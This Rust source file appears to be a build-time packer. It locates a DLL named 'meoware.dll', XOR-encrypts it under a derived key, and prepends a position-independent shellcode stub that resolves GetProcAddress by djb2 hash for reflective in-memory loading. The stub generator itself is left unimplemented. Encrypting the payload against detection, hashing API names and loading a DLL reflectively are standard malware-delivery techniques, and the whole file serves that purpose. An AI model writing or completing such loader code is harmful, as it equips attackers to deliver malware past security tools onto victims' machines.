use std::path::PathBuf;

pub fn find_meoware_dll() -> Option<PathBuf> {
    let out = std::env::var("OUT_DIR").ok()?;
    let out_path = PathBuf::from(&out);
    let mut search = out_path.as_path();
    for _ in 0..5 {
        search = search.parent()?;
        let candidate = search.join("meoware.dll");
        if candidate.exists() { return Some(candidate); }
    }
    None
}

fn djb2(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &c in name {
        if c == 0 { break; }
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}


pub fn generate_reflective_shellcode(dll_bytes: &[u8], build_key: &[u8]) -> Vec<u8> {
    // Derive XOR key;
    let mut pk = [0u8; 16];
    for i in 0..16 {
        pk[i] = build_key[i % build_key.len()]
            .wrapping_add(build_key[(i + 7) % build_key.len()])
            .wrapping_mul(0x5A)
            .wrapping_add(i as u8 + 1);
        if pk[i] == 0 { pk[i] = 0x41; }
    }
    let enc: Vec<u8> = dll_bytes.iter().enumerate().map(|(i, b)| b ^ pk[i % 16]).collect();

    // Metadata header: [size:4][key:16][magic:4][pad:8] = 32 bytes
    let mut header = [0u8; 32];
    header[0..4].copy_from_slice(&(dll_bytes.len() as u32).to_le_bytes());
    header[4..20].copy_from_slice(&pk);
    header[20..24].copy_from_slice(&[0xFE, 0x11, 0x5C, 0x0D]);

    let h_gpa = djb2(b"GetProcAddress");

    // Build string table: null terminated AScII strings after the stub
    let strings: Vec<(&str, Vec<u8>)> = vec![
        ("LoadLibraryA",   b"LoadLibraryA\0".to_vec()),
        ("VirtualAlloc",   b"VirtualAlloc\0".to_vec()),
        ("VirtualProtect", b"VirtualProtect\0".to_vec()),
    ];

    eprintln!("Hash: GetProcAddress=0x{:08X}", h_gpa);

    let (stub, str_offsets) = gen_stub(h_gpa, &strings);
    eprintln!("PIC stub: {} bytes, strings: {} bytes, DLL: {} bytes", stub.len(), str_offsets.1, enc.len());

    let mut sc = Vec::with_capacity(stub.len() + str_offsets.1 + 32 + enc.len());
    sc.extend_from_slice(&stub);
    // Sting table is already appended inside gen_stub
    // Append metadata + encrypted DLL
    sc.extend_from_slice(&header);
    sc.extend(&enc);
    sc
}


/**
 * PIC Stub Generator
 * */
fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, usize)) {
    unimplemented!()
}